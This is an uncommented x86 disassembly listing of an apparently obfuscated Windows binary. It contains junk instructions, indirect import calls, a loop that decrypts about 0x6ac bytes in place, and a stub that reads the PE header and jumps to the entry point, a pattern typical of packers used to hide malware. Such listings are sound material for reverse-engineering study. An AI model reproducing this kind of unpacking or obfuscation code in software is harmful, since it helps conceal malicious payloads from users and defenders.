  4d0763:	add    esp,0x5c
  4d0766:	pop    ebp
  4d0767:	ret    
  4d0768:	pop    edi
  4d0769:	call   DWORD PTR ds:0x4d201c
  4d076f:	call   edi
  4d0771:	add    BYTE PTR [eax],al
  4d0773:	add    BYTE PTR [edi-0x1],bl
  4d0776:	adc    eax,0x4d20a0
  4d077b:	call   edi
  4d077d:	add    BYTE PTR [eax],al
  4d077f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0785:	sub    esp,0x3c
  4d0788:	lea    ebx,[ecx-0x5c]
  4d078b:	cmp    ebx,0x5cbe
  4d0791:	jbe    0x4d0783
  4d0793:	push   ebx
  4d0794:	push   DWORD PTR [ebx+0x90]
  4d079a:	push   esi
  4d079b:	push   DWORD PTR [ebx+0x118]
  4d07a1:	push   edi
  4d07a2:	call   0x4d0c4c
  4d07a7:	add    esp,0x10
  4d07aa:	pop    ebx
  4d07ab:	push   0x0
  4d07ad:	call   0x4d0d8c
  4d07b2:	add    esp,0x4
  4d07b5:	mov    esi,0xfffffff4
  4d07ba:	push   esi
  4d07bb:	call   0x4d1000
  4d07c0:	add    esp,0x4
  4d07c3:	add    esp,0x3c
  4d07c6:	pop    ebp
  4d07c7:	ret    
  4d07c8:	mov    edi,edi
  4d07ca:	push   ebp
  4d07cb:	mov    ebp,esp
  4d07cd:	sub    esp,0x38
  4d07d0:	cmp    edi,0x1d26
  4d07d6:	je     0x4d07cb
  4d07d8:	mov    ecx,0x4d30f0
  4d07dd:	push   ecx
  4d07de:	push   0x6ac
  4d07e3:	mov    edx,0x6ac
  4d07e8:	push   edx
  4d07e9:	mov    ebx,0x40001
  4d07ee:	push   ebx
  4d07ef:	mov    esi,0x862985aa
  4d07f4:	push   DWORD PTR [esi+0x7a239a86]
  4d07fa:	sub    DWORD PTR [esp],0x2
  4d07fe:	mov    esi,0x4d2040
  4d0803:	pop    DWORD PTR [esi]
  4d0805:	call   0x4d0c40
  4d080a:	add    esp,0x4
  4d080d:	xchg   DWORD PTR [esp],eax
  4d0810:	mov    ecx,eax
  4d0812:	pop    DWORD PTR [ecx-0x94]
  4d0818:	mov    esi,DWORD PTR [ecx-0x94]
  4d081e:	mov    edi,esi
  4d0820:	sub    edx,edx
  4d0822:	dec    edx
  4d0823:	and    edx,0x4d0014
  4d0829:	mov    ebx,0x8d9ae218
  4d082e:	xor    eax,eax
  4d0830:	xor    esi,esi
  4d0832:	push   DWORD PTR [edx+esi*1]
  4d0835:	add    DWORD PTR [esp],ebx
  4d0838:	pop    DWORD PTR [edi+esi*2]
  4d083b:	dec    DWORD PTR [edi]
  4d083d:	xor    ebx,ebx
  4d083f:	add    ebx,DWORD PTR [edx]
  4d0841:	add    edx,0x4
  4d0844:	add    edi,0x4
  4d0847:	add    eax,0x4
  4d084a:	cmp    eax,0x6ac
  4d084f:	jne    0x4d0830
  4d0851:	push   ecx
  4d0852:	lea    esi,[ecx-0xf0]
  4d0858:	push   esi
  4d0859:	call   0x4d1574
  4d085e:	add    esp,0x4
  4d0861:	test   eax,eax
  4d0863:	jne    0x4d0852
  4d0865:	pop    ecx
  4d0866:	add    esp,0x38
  4d0869:	pop    ebp
  4d086a:	ret    
  4d086b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0871:	sub    esp,0x20
  4d0874:	mov    edi,0x4d3154
  4d0879:	or     DWORD PTR [ebp-0x8],eax
  4d087c:	push   edi
  4d087d:	call   0x4d0ae8
  4d0882:	add    esp,0x4
  4d0885:	pop    edi
  4d0886:	push   edi
  4d0887:	push   ebx
  4d0888:	push   DWORD PTR [edi+0x70]
  4d088b:	call   0x4d0b38
  4d0890:	add    esp,0x8
  4d0893:	pop    edi
  4d0894:	mov    esi,0x4d202c
  4d0899:	mov    esi,DWORD PTR [esi]
  4d089b:	push   esi
  4d089c:	push   DWORD PTR [edi-0xf8]
  4d08a2:	pop    edx
  4d08a3:	call   edx
  4d08a5:	add    esp,0x20
  4d08a8:	pop    ebp
  4d08a9:	ret    
  4d08aa:	add    BYTE PTR [eax],al
  4d08ac:	mov    edi,edi
  4d08ae:	push   ebp
  4d08af:	mov    ebp,esp
  4d08b1:	sub    esp,0x60
  4d08b4:	lea    eax,[edx+0x108]
  4d08ba:	sub    edx,0xade
  4d08c0:	push   eax
  4d08c1:	push   DWORD PTR [eax+0x1ac]
  4d08c7:	push   ebx
  4d08c8:	push   esi
  4d08c9:	call   0x4d0fbc
  4d08ce:	add    esp,0xc
  4d08d1:	pop    eax
  4d08d2:	push   eax
  4d08d3:	push   0x0
  4d08d5:	call   0x4d1110
  4d08da:	add    esp,0x4
  4d08dd:	pop    eax
  4d08de:	push   eax
  4d08df:	call   0x4d1520
  4d08e4:	add    esp,0x4
  4d08e7:	pop    eax
  4d08e8:	add    esp,0x60
  4d08eb:	pop    ebp
  4d08ec:	ret    
  4d08ed:	add    BYTE PTR [eax],al
  4d08ef:	add    BYTE PTR [edi-0x1],bl
  4d08f2:	adc    eax,0x4d208c
  4d08f7:	call   edi
  4d08f9:	add    BYTE PTR [eax],al
  4d08fb:	add    BYTE PTR [edi-0x1],bl
  4d08fe:	adc    eax,0x4d2054
  4d0903:	call   edi
  4d0905:	add    BYTE PTR [eax],al
  4d0907:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d090d:	sub    esp,0x44
  4d0910:	mov    edi,0x4d31e8
  4d0915:	adc    DWORD PTR [edi-0x68],0xffff8336
  4d091c:	push   edi
  4d091d:	mov    edi,0xfffffff4
  4d0922:	push   edi
  4d0923:	call   0x4d1000
  4d0928:	add    esp,0x4
  4d092b:	pop    edi
  4d092c:	push   edi
  4d092d:	push   DWORD PTR [edi+0x2c]
  4d0930:	push   DWORD PTR [edi+0x18]
  4d0933:	push   edx
  4d0934:	call   0x4d0da4
  4d0939:	add    esp,0xc
  4d093c:	pop    edi
  4d093d:	push   edi
  4d093e:	mov    ebx,0x0
  4d0943:	push   ebx
  4d0944:	call   0x4d0768
  4d0949:	add    esp,0x4
  4d094c:	pop    edi
  4d094d:	add    esp,0x44
  4d0950:	pop    ebp
  4d0951:	ret    
  4d0952:	add    BYTE PTR [eax],al
  4d0954:	mov    edi,edi
  4d0956:	push   ebp
  4d0957:	mov    ebp,esp
  4d0959:	sub    esp,0x38
  4d095c:	lea    edx,[eax+0x148]
  4d0962:	mov    eax,esi
  4d0964:	push   edx
  4d0965:	push   eax
  4d0966:	push   edi
  4d0967:	push   DWORD PTR [edx+0x1ec]
  4d096d:	call   0x4d13d8
  4d0972:	add    esp,0xc
  4d0975:	pop    edx
  4d0976:	push   edx
  4d0977:	push   0x0
  4d0979:	call   0x4d0b84
  4d097e:	add    esp,0x4
  4d0981:	pop    edx
  4d0982:	push   edx
  4d0983:	mov    esi,0x0
  4d0988:	push   esi
  4d0989:	call   0x4d1110
  4d098e:	add    esp,0x4
  4d0991:	pop    edx
  4d0992:	add    esp,0x38
  4d0995:	pop    ebp
  4d0996:	ret    
  4d0997:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d099d:	sub    esp,0x54
  4d09a0:	lea    eax,ds:0x4d30d0
  4d09a6:	adc    DWORD PTR [ebp-0x34],0xffffff84
  4d09aa:	push   eax
  4d09ab:	push   edi
  4d09ac:	push   DWORD PTR [eax+0x124]
  4d09b2:	push   DWORD PTR [eax+0x120]
  4d09b8:	push   ebx
  4d09b9:	call   0x4d0f14
  4d09be:	add    esp,0x10
  4d09c1:	pop    eax
  4d09c2:	push   eax
  4d09c3:	mov    ecx,0xfffffff4
  4d09c8:	push   ecx
  4d09c9:	call   0x4d1000
  4d09ce:	add    esp,0x4
  4d09d1:	pop    eax
  4d09d2:	push   eax
  4d09d3:	mov    edx,0x0
  4d09d8:	push   edx
  4d09d9:	call   0x4d0d8c
  4d09de:	add    esp,0x4
  4d09e1:	pop    eax
  4d09e2:	add    esp,0x54
  4d09e5:	pop    ebp
  4d09e6:	ret    
  4d09e7:	add    BYTE PTR [edi-0x1],bl
  4d09ea:	adc    eax,0x4d2090
  4d09ef:	call   edi
  4d09f1:	add    BYTE PTR [eax],al
  4d09f3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09f9:	sub    esp,0x20
  4d09fc:	mov    ebx,0x4d318c
  4d0a01:	xor    esi,ecx
  4d0a03:	lea    edi,[ebx-0x18c]
  4d0a09:	push   edi
  4d0a0a:	call   0x4d1574
  4d0a0f:	add    esp,0x4
  4d0a12:	test   eax,eax
  4d0a14:	jne    0x4d0a04
  4d0a16:	push   ebx
  4d0a17:	push   DWORD PTR [ebx+0x1dc]
  4d0a1d:	push   DWORD PTR [ebx+0x98]
  4d0a23:	push   eax
  4d0a24:	call   0x4d0e90
  4d0a29:	add    esp,0xc
  4d0a2c:	pop    ebx
  4d0a2d:	mov    edx,0x0
  4d0a32:	push   edx
  4d0a33:	call   0x4d1110
  4d0a38:	add    esp,0x4
  4d0a3b:	add    esp,0x20
  4d0a3e:	pop    ebp
  4d0a3f:	ret    
  4d0a40:	mov    edi,edi
  4d0a42:	push   ebp
  4d0a43:	mov    ebp,esp
  4d0a45:	sub    esp,0x58
  4d0a48:	lea    edi,[ecx-0x90]
  4d0a4e:	cmp    edi,0x336f
  4d0a54:	je     0x4d0a43
  4d0a56:	push   edi
  4d0a57:	push   ecx
  4d0a58:	push   DWORD PTR [edi+0xd8]
  4d0a5e:	push   esi
  4d0a5f:	call   0x4d111c
  4d0a64:	add    esp,0xc
  4d0a67:	pop    edi
  4d0a68:	push   edi
  4d0a69:	push   0x0
  4d0a6b:	call   0x4d100c
  4d0a70:	add    esp,0x4
  4d0a73:	pop    edi
  4d0a74:	push   edi
  4d0a75:	call   0x4d0f60
  4d0a7a:	add    esp,0x4
  4d0a7d:	pop    edi
  4d0a7e:	add    esp,0x58
  4d0a81:	pop    ebp
  4d0a82:	ret    
  4d0a83:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a89:	sub    esp,0x24
  4d0a8c:	mov    ecx,0x4d31d0
  4d0a91:	adc    eax,0x4a1e
  4d0a96:	push   ecx
  4d0a97:	push   ebx
  4d0a98:	push   DWORD PTR [ecx+0x80]
  4d0a9e:	push   esi
  4d0a9f:	push   esi
  4d0aa0:	call   0x4d0780
  4d0aa5:	add    esp,0x10
  4d0aa8:	pop    ecx
  4d0aa9:	push   ecx
  4d0aaa:	mov    eax,0x0
  4d0aaf:	push   eax
  4d0ab0:	call   0x4d0b84
  4d0ab5:	add    esp,0x4
  4d0ab8:	pop    ecx
  4d0ab9:	push   ecx
  4d0aba:	mov    ecx,0x0
  4d0abf:	push   ecx
  4d0ac0:	call   0x4d1110
  4d0ac5:	add    esp,0x4
  4d0ac8:	pop    ecx
  4d0ac9:	add    esp,0x24
  4d0acc:	pop    ebp
  4d0acd:	ret    
  4d0ace:	add    BYTE PTR [eax],al
  4d0ad0:	pop    edi
  4d0ad1:	call   DWORD PTR ds:0x4d207c
  4d0ad7:	call   edi
  4d0ad9:	add    BYTE PTR [eax],al
  4d0adb:	add    BYTE PTR [edi-0x1],bl
  4d0ade:	adc    eax,0x4d2084
  4d0ae3:	call   edi
  4d0ae5:	add    BYTE PTR [eax],al
  4d0ae7:	add    BYTE PTR [edi-0x1],bl
  4d0aea:	adc    eax,0x4d2020
  4d0aef:	call   edi
  4d0af1:	add    BYTE PTR [eax],al
  4d0af3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0af9:	sub    esp,0x24
  4d0afc:	lea    edi,[edx+0xe8]
  4d0b02:	adc    DWORD PTR [edi-0x30],0xffff942b
  4d0b09:	push   edi
  4d0b0a:	push   DWORD PTR [edi+0xec]
  4d0b10:	push   eax
  4d0b11:	push   edx
  4d0b12:	push   ebx
  4d0b13:	call   0x4d152c
  4d0b18:	add    esp,0x10
  4d0b1b:	pop    edi
  4d0b1c:	push   edi
  4d0b1d:	push   0x0
  4d0b1f:	call   0x4d0e3c
  4d0b24:	add    esp,0x4
  4d0b27:	pop    edi
  4d0b28:	push   edi
  4d0b29:	call   0x4d1520
  4d0b2e:	add    esp,0x4
  4d0b31:	pop    edi
  4d0b32:	add    esp,0x24
  4d0b35:	pop    ebp
  4d0b36:	ret    
  4d0b37:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b3d:	sub    esp,0x3c
  4d0b40:	mov    ecx,0x4d3080
  4d0b45:	mov    DWORD PTR [ecx+0xe0],0x4f
  4d0b4f:	push   ecx
  4d0b50:	push   DWORD PTR [ecx+0xbc]
  4d0b56:	push   DWORD PTR [ecx+0x1ec]
  4d0b5c:	push   eax
  4d0b5d:	call   0x4d0998
  4d0b62:	add    esp,0xc
  4d0b65:	pop    ecx
  4d0b66:	push   ecx
  4d0b67:	push   0xfffffff4
  4d0b69:	call   0x4d1000
  4d0b6e:	add    esp,0x4
  4d0b71:	pop    ecx
  4d0b72:	push   ecx
  4d0b73:	call   0x4d0ae8
  4d0b78:	add    esp,0x4
  4d0b7b:	pop    ecx
  4d0b7c:	add    esp,0x3c
  4d0b7f:	pop    ebp
  4d0b80:	ret    
  4d0b81:	add    BYTE PTR [eax],al
  4d0b83:	add    BYTE PTR [edi-0x1],bl
  4d0b86:	adc    eax,0x4d2044
  4d0b8b:	call   edi
  4d0b8d:	add    BYTE PTR [eax],al
  4d0b8f:	add    BYTE PTR [edi-0x1],bl
  4d0b92:	adc    eax,0x4d2008
  4d0b97:	call   edi
  4d0b99:	add    BYTE PTR [eax],al
  4d0b9b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ba1:	sub    esp,0x58
  4d0ba4:	lea    edi,[ecx+0x9c]
  4d0baa:	xor    DWORD PTR [edi+0x78],0xffffabf0
  4d0bb1:	push   edi
  4d0bb2:	mov    ebx,0x0
  4d0bb7:	push   ebx
  4d0bb8:	call   0x4d0b84
  4d0bbd:	add    esp,0x4
  4d0bc0:	pop    edi
  4d0bc1:	push   edi
  4d0bc2:	push   DWORD PTR [edi+0xd0]
  4d0bc8:	push   DWORD PTR [edi+0x9c]
  4d0bce:	push   esi
  4d0bcf:	call   0x4d07c8
  4d0bd4:	add    esp,0xc
  4d0bd7:	pop    edi
  4d0bd8:	push   edi
  4d0bd9:	mov    esi,0x0
  4d0bde:	push   esi
  4d0bdf:	call   0x4d0e3c
  4d0be4:	add    esp,0x4
  4d0be7:	pop    edi
  4d0be8:	add    esp,0x58
  4d0beb:	pop    ebp
  4d0bec:	ret    
  4d0bed:	add    BYTE PTR [eax],al
  4d0bef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bf5:	sub    esp,0x24
  4d0bf8:	lea    eax,[edx-0x114]
  4d0bfe:	sub    esi,ebx
  4d0c00:	push   eax
  4d0c01:	push   0x0
  4d0c03:	call   0x4d0b84
  4d0c08:	add    esp,0x4
  4d0c0b:	pop    eax
  4d0c0c:	push   eax
  4d0c0d:	push   ebx
  4d0c0e:	push   DWORD PTR [eax+0x198]
  4d0c14:	call   0x4d0a84
  4d0c19:	add    esp,0x8
  4d0c1c:	pop    eax
  4d0c1d:	push   eax
  4d0c1e:	mov    ebx,0x0
  4d0c23:	push   ebx
  4d0c24:	call   0x4d0b84
  4d0c29:	add    esp,0x4
  4d0c2c:	pop    eax
  4d0c2d:	add    esp,0x24
  4d0c30:	pop    ebp
  4d0c31:	ret    
  4d0c32:	add    BYTE PTR [eax],al
  4d0c34:	pop    edi
  4d0c35:	call   DWORD PTR ds:0x4d2094
  4d0c3b:	call   edi
  4d0c3d:	add    BYTE PTR [eax],al
  4d0c3f:	add    BYTE PTR [edi-0x1],bl
  4d0c42:	adc    eax,0x4d2040
  4d0c47:	call   edi
  4d0c49:	add    BYTE PTR [eax],al
  4d0c4b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c51:	sub    esp,0x4c
  4d0c54:	mov    ecx,0x4d3004
  4d0c59:	sub    DWORD PTR [ebp-0x38],0xffffdd8a
  4d0c60:	push   ecx
  4d0c61:	push   0x0
  4d0c63:	call   0x4d0768
  4d0c68:	add    esp,0x4
  4d0c6b:	pop    ecx
  4d0c6c:	push   ecx
  4d0c6d:	push   DWORD PTR [ecx+0x154]
  4d0c73:	push   edi
  4d0c74:	push   esi
  4d0c75:	call   0x4d0b9c
  4d0c7a:	add    esp,0xc
  4d0c7d:	pop    ecx
  4d0c7e:	push   ecx
  4d0c7f:	lea    edi,[ecx-0x4]
  4d0c82:	push   edi
  4d0c83:	call   0x4d1574
  4d0c88:	add    esp,0x4
  4d0c8b:	test   eax,eax
  4d0c8d:	jne    0x4d0c7f
  4d0c8f:	pop    ecx
  4d0c90:	add    esp,0x4c
  4d0c93:	pop    ebp
  4d0c94:	ret    
  4d0c95:	add    BYTE PTR [eax],al
  4d0c97:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c9d:	sub    esp,0x2c
  4d0ca0:	mov    edi,0x4d3100
  4d0ca5:	or     ebx,DWORD PTR [edi+0xa4]
  4d0cab:	push   edi
  4d0cac:	push   edx
  4d0cad:	push   DWORD PTR [edi+0x110]
  4d0cb3:	push   DWORD PTR [edi+0x88]
  4d0cb9:	push   DWORD PTR [edi+0x48]
  4d0cbc:	call   0x4d12a0
  4d0cc1:	add    esp,0x10
  4d0cc4:	pop    edi
  4d0cc5:	push   edi
  4d0cc6:	push   0x0
  4d0cc8:	call   0x4d0768
  4d0ccd:	add    esp,0x4
  4d0cd0:	pop    edi
  4d0cd1:	push   edi
  4d0cd2:	push   0xfffffff4
  4d0cd4:	call   0x4d1000
  4d0cd9:	add    esp,0x4
  4d0cdc:	pop    edi
  4d0cdd:	add    esp,0x2c
  4d0ce0:	pop    ebp
  4d0ce1:	ret    
  4d0ce2:	add    BYTE PTR [eax],al
  4d0ce4:	push   edi
  4d0ce5:	sub    edi,edi
  4d0ce7:	push   edi
  4d0ce8:	push   edi
  4d0ce9:	push   edi
  4d0cea:	push   edi
  4d0ceb:	call   0x4d0f60
  4d0cf0:	sub    esp,0xfffffffc
  4d0cf3:	call   0x4d1508
  4d0cf8:	push   0x2
  4d0cfa:	xor    eax,eax
  4d0cfc:	sub    eax,0x4d3030
  4d0d01:	neg    eax
  4d0d03:	push   0x0
  4d0d05:	lea    ecx,[eax+0x4]
  4d0d08:	add    BYTE PTR [ecx],0x3
  4d0d0b:	push   eax
  4d0d0c:	call   0x4d0c40
  4d0d11:	pop    edi
  4d0d12:	pop    edi
  4d0d13:	pop    edi
  4d0d14:	lea    ecx,[eax+0x3b]
  4d0d17:	mov    edi,DWORD PTR [ecx]
  4d0d19:	lea    eax,[eax+edi*1]
  4d0d1c:	mov    eax,DWORD PTR [eax+0x28]
  4d0d1f:	pusha  
  4d0d20:	mov    ah,0x45
  4d0d22:	sub    al,ah
  4d0d24:	ja     0x4d086c
  4d0d2a:	popa   
  4d0d2b:	ret    
  4d0d2c:	mov    edi,edi
  4d0d2e:	push   ebp
  4d0d2f:	mov    ebp,esp
  4d0d31:	sub    esp,0x38
  4d0d34:	lea    edx,[ebx+0xcc]
  4d0d3a:	cmp    edx,0x802
  4d0d40:	jbe    0x4d0d2f
  4d0d42:	push   edx
  4d0d43:	push   DWORD PTR [edx+0xc8]
  4d0d49:	push   DWORD PTR [edx+0x18]
  4d0d4c:	push   DWORD PTR [edx+0x18c]
  4d0d52:	call   0x4d0bf0
  4d0d57:	add    esp,0xc
  4d0d5a:	pop    edx
  4d0d5b:	push   edx
  4d0d5c:	mov    ecx,0x0
  4d0d61:	push   ecx
  4d0d62:	call   0x4d100c
  4d0d67:	add    esp,0x4
  4d0d6a:	pop    edx
  4d0d6b:	push   edx
  4d0d6c:	mov    eax,0x0
  4d0d71:	push   eax
  4d0d72:	call   0x4d0768
  4d0d77:	add    esp,0x4
  4d0d7a:	pop    edx
  4d0d7b:	add    esp,0x38
  4d0d7e:	pop    ebp
  4d0d7f:	ret    
  4d0d80:	pop    edi
  4d0d81:	call   DWORD PTR ds:0x4d2088
  4d0d87:	call   edi
  4d0d89:	add    BYTE PTR [eax],al
  4d0d8b:	add    BYTE PTR [edi-0x1],bl
  4d0d8e:	adc    eax,0x4d2058
  4d0d93:	call   edi
  4d0d95:	add    BYTE PTR [eax],al
  4d0d97:	add    BYTE PTR [edi-0x1],bl
  4d0d9a:	adc    eax,0x4d2068
  4d0d9f:	call   edi
  4d0da1:	add    BYTE PTR [eax],al
  4d0da3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0da9:	sub    esp,0x20
  4d0dac:	mov    esi,0x4d311c
  4d0db1:	sbb    DWORD PTR [ebp-0x18],ecx
  4d0db4:	push   0x0
  4d0db6:	call   0x4d1308
  4d0dbb:	add    esp,0x4
  4d0dbe:	push   esi
  4d0dbf:	push   edx
  4d0dc0:	push   DWORD PTR [esi+0x34]
  4d0dc3:	push   DWORD PTR [esi+0x108]
  4d0dc9:	push   edi
  4d0dca:	call   0x4d11b8
  4d0dcf:	add    esp,0x10
  4d0dd2:	pop    esi
  4d0dd3:	push   0x0
  4d0dd5:	call   0x4d0b84
  4d0dda:	add    esp,0x4
  4d0ddd:	add    esp,0x20
  4d0de0:	pop    ebp
  4d0de1:	ret    
  4d0de2:	add    BYTE PTR [eax],al
  4d0de4:	mov    edi,edi
  4d0de6:	push   ebp
  4d0de7:	mov    ebp,esp
  4d0de9:	sub    esp,0x34
  4d0dec:	lea    edi,ds:0x4d3110
  4d0df2:	xor    DWORD PTR [ebp-0x1c],0xffffea49
  4d0df9:	push   edi
  4d0dfa:	lea    edx,[edi-0x110]
  4d0e00:	push   edx
  4d0e01:	call   0x4d1574
  4d0e06:	add    esp,0x4
  4d0e09:	test   eax,eax
  4d0e0b:	jne    0x4d0dfa
  4d0e0d:	pop    edi
  4d0e0e:	push   edi
  4d0e0f:	push   DWORD PTR [edi+0x138]
  4d0e15:	push   ebx
  4d0e16:	call   0x4d1424
  4d0e1b:	add    esp,0x8
  4d0e1e:	pop    edi
  4d0e1f:	push   edi
  4d0e20:	push   0x0
  4d0e22:	call   0x4d14ac
  4d0e27:	add    esp,0x4
  4d0e2a:	pop    edi
  4d0e2b:	add    esp,0x34
  4d0e2e:	pop    ebp
  4d0e2f:	ret    
  4d0e30:	pop    edi
  4d0e31:	call   DWORD PTR ds:0x4d2060
  4d0e37:	call   edi
  4d0e39:	add    BYTE PTR [eax],al
  4d0e3b:	add    BYTE PTR [edi-0x1],bl
  4d0e3e:	adc    eax,0x4d200c
  4d0e43:	call   edi
  4d0e45:	add    BYTE PTR [eax],al
  4d0e47:	add    BYTE PTR [edi-0x1],bl
  4d0e4a:	adc    eax,0x4d2080
  4d0e4f:	call   edi
  4d0e51:	add    BYTE PTR [eax],al
  4d0e53:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e59:	sub    esp,0x24
  4d0e5c:	lea    edx,[edi-0xcc]
  4d0e62:	xor    DWORD PTR [ebp-0xc],esi
  4d0e65:	push   edx
  4d0e66:	push   ebx
  4d0e67:	push   eax
  4d0e68:	push   DWORD PTR [edx+0x11c]
  4d0e6e:	call   0x4d0af4
  4d0e73:	add    esp,0xc
  4d0e76:	pop    edx
  4d0e77:	push   edx
  4d0e78:	call   0x4d0ae8
  4d0e7d:	add    esp,0x4
  4d0e80:	pop    edx
  4d0e81:	push   edx
  4d0e82:	call   0x4d1520
  4d0e87:	add    esp,0x4
  4d0e8a:	pop    edx
  4d0e8b:	add    esp,0x24
  4d0e8e:	pop    ebp
  4d0e8f:	ret    
  4d0e90:	mov    edi,edi
  4d0e92:	push   ebp
  4d0e93:	mov    ebp,esp
  4d0e95:	sub    esp,0x38
  4d0e98:	lea    edx,ds:0x4d3158
  4d0e9e:	and    eax,DWORD PTR [ebp-0x10]
  4d0ea1:	push   edx
  4d0ea2:	mov    ecx,0x0
  4d0ea7:	push   ecx
  4d0ea8:	call   0x4d10c0
  4d0ead:	add    esp,0x4
  4d0eb0:	pop    edx
  4d0eb1:	push   edx
  4d0eb2:	push   DWORD PTR [edx+0x10c]
  4d0eb8:	push   edi
  4d0eb9:	push   DWORD PTR [edx+0x28]
  4d0ebc:	call   0x4d06ec
  4d0ec1:	add    esp,0xc
  4d0ec4:	pop    edx
  4d0ec5:	push   edx
  4d0ec6:	push   0x0
  4d0ec8:	call   0x4d0768
  4d0ecd:	add    esp,0x4
  4d0ed0:	pop    edx
  4d0ed1:	add    esp,0x38
  4d0ed4:	pop    ebp
  4d0ed5:	ret    
  4d0ed6:	add    BYTE PTR [eax],al
  4d0ed8:	mov    edi,edi
  4d0eda:	push   ebp
  4d0edb:	mov    ebp,esp
  4d0edd:	sub    esp,0x24
  4d0ee0:	lea    esi,[eax+0xe8]
  4d0ee6:	and    DWORD PTR [esi+0x44],edx
  4d0ee9:	push   esi
  4d0eea:	push   edx
  4d0eeb:	push   DWORD PTR [esi+0x1ec]
  4d0ef1:	push   edi
  4d0ef2:	call   0x4d09f4
  4d0ef7:	add    esp,0xc
  4d0efa:	pop    esi
  4d0efb:	push   0x0
  4d0efd:	call   0x4d15d8
  4d0f02:	add    esp,0x4
  4d0f05:	push   0x0
  4d0f07:	call   0x4d1308
  4d0f0c:	add    esp,0x4
  4d0f0f:	add    esp,0x24
  4d0f12:	pop    ebp
  4d0f13:	ret    
  4d0f14:	mov    edi,edi
  4d0f16:	push   ebp
  4d0f17:	mov    ebp,esp
  4d0f19:	sub    esp,0x3c
  4d0f1c:	lea    ecx,ds:0x4d31f0
  4d0f22:	xor    eax,DWORD PTR [ecx-0xa0]
  4d0f28:	push   ecx
  4d0f29:	push   DWORD PTR [ecx+0x88]
  4d0f2f:	push   eax
  4d0f30:	push   DWORD PTR [ecx+0xf4]
  4d0f36:	call   0x4d1314
  4d0f3b:	add    esp,0xc
  4d0f3e:	pop    ecx
  4d0f3f:	push   ecx
  4d0f40:	call   0x4d0f60
  4d0f45:	add    esp,0x4
  4d0f48:	pop    ecx
  4d0f49:	push   ecx
  4d0f4a:	mov    edi,0x0
  4d0f4f:	push   edi
  4d0f50:	call   0x4d14ac
  4d0f55:	add    esp,0x4
  4d0f58:	pop    ecx
  4d0f59:	add    esp,0x3c
  4d0f5c:	pop    ebp
  4d0f5d:	ret    
  4d0f5e:	add    BYTE PTR [eax],al
  4d0f60:	pop    edi
  4d0f61:	call   DWORD PTR ds:0x4d2010
  4d0f67:	call   edi
  4d0f69:	add    BYTE PTR [eax],al
  4d0f6b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f71:	sub    esp,0x50
  4d0f74:	lea    edx,ds:0x4d30c8
  4d0f7a:	xor    DWORD PTR [edx-0x1c],0xffffffc9
  4d0f7e:	push   edx
  4d0f7f:	push   edi
  4d0f80:	push   eax
  4d0f81:	call   0x4d08ac
  4d0f86:	add    esp,0x8
  4d0f89:	pop    edx
  4d0f8a:	push   edx
  4d0f8b:	lea    ecx,[edx-0xc8]
  4d0f91:	push   ecx
  4d0f92:	call   0x4d1574
  4d0f97:	add    esp,0x4
  4d0f9a:	test   eax,eax
  4d0f9c:	jne    0x4d0f8b
  4d0f9e:	pop    edx
  4d0f9f:	push   edx
  4d0fa0:	lea    edi,[edx-0xc8]
  4d0fa6:	push   edi
  4d0fa7:	call   0x4d1574
  4d0fac:	add    esp,0x4
  4d0faf:	test   eax,eax
  4d0fb1:	jne    0x4d0fa0
  4d0fb3:	pop    edx
  4d0fb4:	add    esp,0x50
  4d0fb7:	pop    ebp
  4d0fb8:	ret    
  4d0fb9:	add    BYTE PTR [eax],al
  4d0fbb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fc1:	sub    esp,0x24
  4d0fc4:	lea    edx,ds:0x4d30d4
  4d0fca:	cmp    edx,0x3771
  4d0fd0:	jbe    0x4d0fbf
  4d0fd2:	push   edx
  4d0fd3:	push   DWORD PTR [edx+0x194]
  4d0fd9:	push   esi
  4d0fda:	call   0x4d0de4
  4d0fdf:	add    esp,0x8
  4d0fe2:	pop    edx
  4d0fe3:	push   edx
  4d0fe4:	push   0x0
  4d0fe6:	call   0x4d10c0
  4d0feb:	add    esp,0x4
  4d0fee:	pop    edx
  4d0fef:	push   edx
  4d0ff0:	push   0x0
  4d0ff2:	call   0x4d0e3c
  4d0ff7:	add    esp,0x4
  4d0ffa:	pop    edx
  4d0ffb:	add    esp,0x24
  4d0ffe:	pop    ebp
  4d0fff:	ret    
  4d1000:	pop    edi
  4d1001:	call   DWORD PTR ds:0x4d2004
  4d1007:	call   edi
  4d1009:	add    BYTE PTR [eax],al
  4d100b:	add    BYTE PTR [edi-0x1],bl
  4d100e:	adc    eax,0x4d203c
  4d1013:	call   edi
  4d1015:	add    BYTE PTR [eax],al
  4d1017:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d101d:	sub    esp,0x54
  4d1020:	lea    eax,[ecx-0x15c]
  4d1026:	mov    DWORD PTR [ebp-0x40],ecx
  4d1029:	push   eax
  4d102a:	push   0x0
  4d102c:	call   0x4d14ac
  4d1031:	add    esp,0x4
  4d1034:	pop    eax
  4d1035:	push   eax
  4d1036:	push   DWORD PTR [eax+0x70]
  4d1039:	push   DWORD PTR [eax+0x1dc]
  4d103f:	push   DWORD PTR [eax+0xb8]
  4d1045:	push   DWORD PTR [eax+0x1a8]
  4d104b:	call   0x4d1580
  4d1050:	add    esp,0x10
  4d1053:	pop    eax
  4d1054:	push   eax
  4d1055:	push   0x0
  4d1057:	call   0x4d0768
  4d105c:	add    esp,0x4
  4d105f:	pop    eax
  4d1060:	add    esp,0x54
  4d1063:	pop    ebp
  4d1064:	ret    
  4d1065:	add    BYTE PTR [eax],al
  4d1067:	add    BYTE PTR [edi-0x1],bl
  4d106a:	adc    eax,0x4d206c
  4d106f:	call   edi
  4d1071:	add    BYTE PTR [eax],al
  4d1073:	add    BYTE PTR [edi-0x1],bl
  4d1076:	adc    eax,0x4d2078
